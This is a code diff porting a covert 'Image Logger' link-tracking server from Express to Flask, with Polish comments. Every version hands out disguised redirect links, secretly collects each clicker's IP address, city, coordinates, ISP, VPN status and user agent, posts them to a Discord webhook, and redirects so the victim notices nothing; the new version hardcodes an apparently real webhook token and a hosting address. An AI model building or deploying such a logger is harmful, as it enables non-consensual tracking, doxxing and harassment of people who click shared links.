@@ -1,104 +1,123 @@
-const express = require('express');
-const axios = require('axios');
-const app = express();
-const PORT = process.env.PORT || 3000;
+from flask import Flask, request, redirect, jsonify
+import requests
+from datetime import datetime
+import random
+import string
 
-const WEBHOOK_URL = 'TUTAJ_WKLEJ_SWOJ_WEBHOOK_URL';
-const linksDatabase = {};
+app = Flask(__name__)
 
-app.post('/generate', express.json(), (req, res) => {
-    const { originalUrl } = req.body;
-    const id = Math.random().toString(36).substring(2, 8);
-    linksDatabase[id] = originalUrl;
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1508140013651624067/nMxvkUrDRE_0GyeZ15dPV_1DIJ04VGUlKlSQCgG6C61v0118dLK81ojbtovwab88Xcal'
+
+# Baza danych w pamięci na potrzeby testów (mapowanie ID -> oryginalny link)
+links_database = {}
+
+def generate_random_id(length=6):
+    """Generuje losowy ciąg znaków dla identyfikatora linku."""
+    characters = string.ascii_lowercase + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
+
+# Endpoint generujący unikalny link (wywoływany przez bota)
+@app.route('/generate', methods=['POST'])
+def generate_link():
+    data = request.get_json()
+    if not data or 'originalUrl' not in data:
+        return jsonify({"error": "Brak oryginalnego URL"}), 400
     
-    // Zmień na adres swojej domeny produkcyjnej
-    res.json({ loggerUrl: `http://localhost:${PORT}/redirect/${id}` });
-});
+    original_url = data['originalUrl']
+    link_id = generate_random_id()
+    links_database[link_id] = original_url
+    
+    # Podmień na adres URL swojej aplikacji na Renderze (np. https://server-mc.onrender.com)
+    logger_url = f"https://server-mc.onrender.com/redirect/{link_id}"
+    
+    return jsonify({"loggerUrl": logger_url})
 
-app.get('/redirect/:id', async (req, res) => {
-    const id = req.params.id;
-    const originalUrl = linksDatabase[id];
+# Endpoint przekierowujący (kliknięcie w link)
+@app.route('/redirect/<link_id>', methods=['GET'])
+def redirect_to_url(link_id):
+    original_url = links_database.get(link_id)
 
-    if (!originalUrl) {
-        return res.status(404).send('Link nie istnieje.');
+    if not original_url:
+        return "Link nie istnieje lub wygasł.", 404
+
+    user_agent = request.headers.get('User-Agent', 'Nieznany')
+    
+    # Pobieranie IP (uwzględniając nagłówki proxy z Rendera)
+    if request.headers.get('X-Forwarded-For'):
+        user_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    else:
+        user_ip = request.remote_addr
+
+    # Domyślne wartości Geo-IP w razie błędu API
+    geo_data = {
+        "status": "fail",
+        "country": "Nieznany",
+        "regionName": "Nieznany",
+        "city": "Nieznany",
+        "isp": "Nieznany",
+        "as": "Nieznany",
+        "lat": 0,
+        "lon": 0,
+        "timezone": "Nieznany",
+        "hosting": False
     }
 
-    const userAgent = req.headers['user-agent'] || 'Nieznany';
-    
-    // Pobieranie IP (w środowisku lokalnym '::1' lub '127.0.0.1' nie zwróci lokalizacji, 
-    // funkcja zadziała w pełni po wrzuceniu na hosting)
-    let userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    if (userIp.includes(',')) {
-        userIp = userIp.split(',')[0].trim();
-    }
-
-    // Domyślne wartości, jeśli API nie zwróci danych
-    let geoData = {
-        status: "fail",
-        country: "Nieznany",
-        regionName: "Nieznany",
-        city: "Nieznany",
-        isp: "Nieznany",
-        as: "Nieznany",
-        lat: 0,
-        lon: 0,
-        timezone: "Nieznany",
-        hosting: false
-    };
-
-    // Pobieranie szczegółowych danych o IP za pomocą darmowego ip-api.com
-    // Pola (fields): country,regionName,city,isp,as,lat,lon,timezone,hosting,status
-    try {
-        // Testowo dla localhost możesz podmienić userIp na prawdziwe IP, np. '181.41.202.157'
-        const ipToCheck = (userIp === '::1' || userIp === '127.0.0.1') ? '181.41.202.157' : userIp;
-        const geoResponse = await axios.get(`http://ip-api.com/json/${ipToCheck}?fields=status,message,country,regionName,city,isp,as,lat,lon,timezone,hosting`);
+    # Odpytywanie darmowego API o szczegóły adresu IP
+    try:
+        # Testowo na localhost możesz podmienić user_ip na stałe ip, np. '181.41.202.157'
+        ip_to_check = '181.41.202.157' if user_ip in ['127.0.0.1', '::1'] else user_ip
         
-        if (geoResponse.data && geoResponse.data.status === 'success') {
-            geoData = geoResponse.data;
-        }
-    } catch (err) {
-        console.error("Błąd podczas pobierania GeoIP:", err.message);
-    }
+        fields = "status,message,country,regionName,city,isp,as,lat,lon,timezone,hosting"
+        geo_response = requests.get(f"http://ip-api.com/json/{ip_to_check}?fields={fields}", timeout=5)
+        
+        if geo_response.status_code == 200:
+            res_json = geo_response.json()
+            if res_json.get('status') == 'success':
+                geo_data = res_json
+    except Exception as e:
+        print(f"Błąd podczas pobierania GeoIP: {e}")
 
-    // Budowanie struktury Discord Embed dokładnie tak, jak na zdjęciu
-    const discordPayload = {
-        embeds: [{
-            title: "🌐 Image Logger - IP Logged",
-            description: "**A User Opened the Original Link!**\n\n**Endpoint:** `/api/image`",
-            color: 1752220, // Kolor paska bocznego (morski/turkusowy)
-            fields: [
+    # Struktura wiadomości Embed dla Discorda
+    discord_payload = {
+        "embeds": [{
+            "title": "🌐 Image Logger - IP Logged",
+            "description": "**A User Opened the Original Link!**\n\n**Endpoint:** `/api/image`",
+            "color": 1752220,  # Kolor morski/turkusowy (Decimal)
+            "fields": [
                 {
-                    name: "📌 IP Info:",
-                    value: [
-                        `**IP:** \`${userIp}\``,
-                        `**Provider:** \`${geoData.isp}\``,
-                        `**ASN:** \`${geoData.as}\``,
-                        `**Country:** \`${geoData.country}\``,
-                        `**Region:** \`${geoData.regionName}\``,
-                        `**City:** \`${geoData.city}\``,
-                        `**Coords:** \`${geoData.lat}, ${geoData.lon}\` (Approximate)`,
-                        `**Timezone:** \`${geoData.timezone}\``,
-                        `**VPN/Hosting:** \`${geoData.hosting ? 'True' : 'False'}\``,
-                        `**User-Agent:** \`${userAgent.substring(0, 100)}...\``
-                    ].join('\n'),
-                    inline: false
+                    "name": "📌 IP Info:",
+                    "value": (
+                        f"**IP:** `{user_ip}`\n"
+                        f"**Provider:** `{geo_data['isp']}`\n"
+                        f"**ASN:** `{geo_data['as']}`\n"
+                        f"**Country:** `{geo_data['country']}`\n"
+                        f"**Region:** `{geo_data['regionName']}`\n"
+                        f"**City:** `{geo_data['city']}`\n"
+                        f"**Coords:** `{geo_data['lat']}, {geo_data['lon']}` (Approximate)\n"
+                        f"**Timezone:** `{geo_data['timezone']}`\n"
+                        f"**VPN/Hosting:** `{'True' if geo_data['hosting'] else 'False'}`\n"
+                        f"**User-Agent:** `{user_agent[:100]}...`"
+                    ),
+                    "inline": False
                 }
             ],
-            footer: {
-                text: `Czas zdarzenia: ${new Date().toLocaleString('pl-PL')}`
+            "footer": {
+                "text": f"Czas zdarzenia: {datetime.now().strftime('%d.%m.%Y, %H:%M:%S')}"
             }
         }]
-    };
-
-    // Wysyłanie gotowego Embedu na Webhook
-    try {
-        await axios.post(WEBHOOK_URL, discordPayload);
-    } catch (error) {
-        console.error("Błąd Webhooka:", error.response ? error.response.data : error.message);
     }
 
-    // Natychmiastowe przekierowanie
-    res.redirect(originalUrl);
-});
+    # Wysyłanie danych na Webhook Discorda
+    try:
+        requests.post(WEBHOOK_URL, json=discord_payload, timeout=5)
+    except Exception as e:
+        print(f"Błąd Webhooka: {e}")
 
-app.listen(PORT, () => console.log(`Serwer logujący działa na porcie ${PORT}`));
+    # Przekierowanie użytkownika na pierwotny adres docelowy
+    return redirect(original_url)
+
+if __name__ == '__main__':
+    # Render wymaga uruchomienia na porcie przekazanym w zmiennej środowiskowej PORT
+    import os
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
